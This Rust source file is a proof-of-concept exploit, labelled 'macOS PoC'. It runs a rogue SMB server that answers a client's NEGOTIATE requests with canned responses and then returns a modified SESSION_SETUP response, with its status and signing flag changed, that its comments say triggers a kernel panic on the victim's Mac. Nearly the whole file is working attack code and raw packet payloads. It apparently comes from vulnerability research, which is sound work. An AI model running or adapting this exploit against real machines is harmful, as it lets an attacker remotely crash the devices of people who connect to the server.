use crate::common::{recv_smb_req, send_smb_res};
use std::net::TcpListener;

/// macOS PoC
pub fn run(listener: TcpListener) {
    let mut buffer = [0; 4096];

    // Accept the 1st connection, which is dropped immediately by the SMB client.
    let (mut stream, addr) = listener.accept().unwrap();
    println!("connection #1: {addr}");
    recv_smb_req(&mut stream, &mut buffer);
    drop(stream);

    // Accept the 2nd connection, which is used to perform all the work.
    let (mut stream, addr) = listener.accept().unwrap();
    println!("connection #2: {addr}");

    // The SMB client sends a 1st NEGOTIATE request with SMB v1.
    recv_smb_req(&mut stream, &mut buffer);
    send_smb_res(&mut stream, RESPONSE_1, false);

    // The SMB client sends a 2nd NEGOTIATE request with SMB v2/3.
    recv_smb_req(&mut stream, &mut buffer);
    send_smb_res(&mut stream, RESPONSE_2, false);

    // The SMB client sends a SESSION_SETUP request. We respond with the
    // malicious payload to trigger a kernel panic on the victim's device.
    recv_smb_req(&mut stream, &mut buffer);
    send_smb_res(&mut stream, RESPONSE_3, true);
}

/// Copied from the 1st NEGOTIATE response of the real smbd server.
const RESPONSE_1: &[u8] = b"\
\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\
\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x41\x00\x03\x00\xff\x02\x00\x00\x5a\x8a\x47\x0f\xd2\x5a\x5a\x1e\
\xba\xa3\x1e\x3e\x54\x2c\xe5\x38\x06\x00\x00\x00\x00\x00\x40\x00\
\x00\x00\x40\x00\x00\x00\x40\x00\x0f\x0c\xd4\xee\x34\x17\xd8\x01\
\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x80\x00\x00\x00\x00\x00\
\x60\x7e\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x74\x30\x72\xa0\x44\
\x30\x42\x06\x09\x2a\x86\x48\x82\xf7\x12\x01\x02\x02\x06\x09\x2a\
\x86\x48\x86\xf7\x12\x01\x02\x02\x06\x06\x2a\x85\x70\x2b\x0e\x03\
\x06\x06\x2b\x06\x01\x05\x05\x0e\x06\x0a\x2b\x06\x01\x04\x01\x82\
\x37\x02\x02\x0a\x06\x06\x2b\x05\x01\x05\x02\x07\x06\x06\x2b\x06\
\x01\x05\x02\x05\xa3\x2a\x30\x28\xa0\x26\x1b\x24\x6e\x6f\x74\x5f\
\x64\x65\x66\x69\x6e\x65\x64\x5f\x69\x6e\x5f\x52\x46\x43\x34\x31\
\x37\x38\x40\x70\x6c\x65\x61\x73\x65\x5f\x69\x67\x6e\x6f\x72\x65";

/// Copied from the 2nd NEGOTIATE response of the real smbd server.
const RESPONSE_2: &[u8] = b"\
\xfe\x53\x4d\x42\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\
\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x41\x00\x03\x00\x02\x03\x00\x00\x5a\x8a\x47\x0f\xd2\x5a\x5a\x1e\
\xba\xa3\x1e\x3e\x54\x2c\xe5\x38\x66\x00\x00\x00\x00\x00\x40\x00\
\x00\x00\x40\x00\x00\x00\x40\x00\x0f\x0c\xd4\xee\x34\x17\xd8\x01\
\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x80\x00\x00\x00\x00\x00\
\x60\x7e\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x74\x30\x72\xa0\x44\
\x30\x42\x06\x09\x2a\x86\x48\x82\xf7\x12\x01\x02\x02\x06\x09\x2a\
\x86\x48\x86\xf7\x12\x01\x02\x02\x06\x06\x2a\x85\x70\x2b\x0e\x03\
\x06\x06\x2b\x06\x01\x05\x05\x0e\x06\x0a\x2b\x06\x01\x04\x01\x82\
\x37\x02\x02\x0a\x06\x06\x2b\x05\x01\x05\x02\x07\x06\x06\x2b\x06\
\x01\x05\x02\x05\xa3\x2a\x30\x28\xa0\x26\x1b\x24\x6e\x6f\x74\x5f\
\x64\x65\x66\x69\x6e\x65\x64\x5f\x69\x6e\x5f\x52\x46\x43\x34\x31\
\x37\x38\x40\x70\x6c\x65\x61\x73\x65\x5f\x69\x67\x6e\x6f\x72\x65";

/// Copied from the 1st SESSION_SETUP response of the real smbd server.
/// However, the following modifications were made:
/// 1. NT_Status (at offset 8-11) is set to STATUS_SUCCESS (0x00000000)
/// 2. Flags (at offset 16-19) is set to SMB2_FLAGS_SIGNED (0x00000008)
const RESPONSE_3: &[u8] = b"\
\xfe\x53\x4d\x42\x40\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x01\
\x08\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\
\xff\xfe\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x96\x69\xb7\x60\
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x09\x00\x00\x00\x48\x00\x82\x01\xa1\x82\x01\x7e\x30\x82\x01\x7a\
\xa0\x03\x0a\x01\x01\xa1\x08\x06\x06\x2b\x06\x01\x05\x02\x05\xa2\
\x82\x01\x67\x04\x82\x01\x63\x60\x82\x01\x5f\x06\x06\x2b\x06\x01\
\x05\x02\x05\x05\x01\x30\x1c\xa1\x1a\x0c\x18\x57\x45\x4c\x4c\x4b\
\x4e\x4f\x57\x4e\x3a\x43\x4f\x4d\x2e\x41\x50\x50\x4c\x45\x2e\x4c\
\x4b\x44\x43\x7e\x82\x01\x33\x30\x82\x01\x2f\xa0\x03\x02\x01\x05\
\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f\x32\x30\x32\x32\x30\x32\x30\
\x31\x30\x37\x30\x30\x35\x37\x5a\xa5\x05\x02\x03\x0e\x66\xb3\xa6\
\x03\x02\x01\x44\xa7\x34\x1b\x32\x4c\x4b\x44\x43\x3a\x53\x48\x41\
\x31\x2e\x41\x30\x31\x46\x35\x43\x44\x30\x32\x30\x36\x32\x43\x42\
\x32\x33\x31\x44\x43\x36\x36\x45\x37\x32\x33\x37\x31\x37\x38\x36\
\x41\x30\x45\x30\x41\x44\x30\x33\x38\x37\xa8\x56\x30\x54\xa0\x03\
\x02\x01\x01\xa1\x4d\x30\x4b\x1b\x49\x63\x6f\x6d\x2e\x61\x70\x70\
\x6c\x65\x2e\x69\x64\x6d\x73\x2e\x61\x70\x70\x6c\x65\x69\x64\x2e\
\x70\x72\x64\x2e\x30\x30\x31\x36\x39\x36\x2d\x30\x38\x2d\x64\x37\
\x35\x31\x64\x31\x35\x33\x2d\x37\x31\x37\x30\x2d\x34\x38\x31\x62\
\x2d\x61\x33\x66\x38\x2d\x63\x37\x34\x62\x36\x63\x30\x34\x61\x64\
\x62\x37\xa9\x1a\x1b\x18\x57\x45\x4c\x4c\x4b\x4e\x4f\x57\x4e\x3a\
\x43\x4f\x4d\x2e\x41\x50\x50\x4c\x45\x2e\x4c\x4b\x44\x43\xaa\x2d\
\x30\x2b\xa0\x03\x02\x01\x02\xa1\x24\x30\x22\x1b\x06\x6b\x72\x62\
\x74\x67\x74\x1b\x18\x57\x45\x4c\x4c\x4b\x4e\x4f\x57\x4e\x3a\x43\
\x4f\x4d\x2e\x41\x50\x50\x4c\x45\x2e\x4c\x4b\x44\x43\xab\x2b\x1b\
\x29\x4c\x4b\x44\x43\x20\x72\x65\x66\x65\x72\x72\x61\x6c\x20\x74\
\x6f\x20\x74\x68\x65\x20\x72\x65\x61\x6c\x20\x4c\x4b\x44\x43\x20\
\x72\x65\x61\x6c\x6d\x20\x6e\x61\x6d\x65";
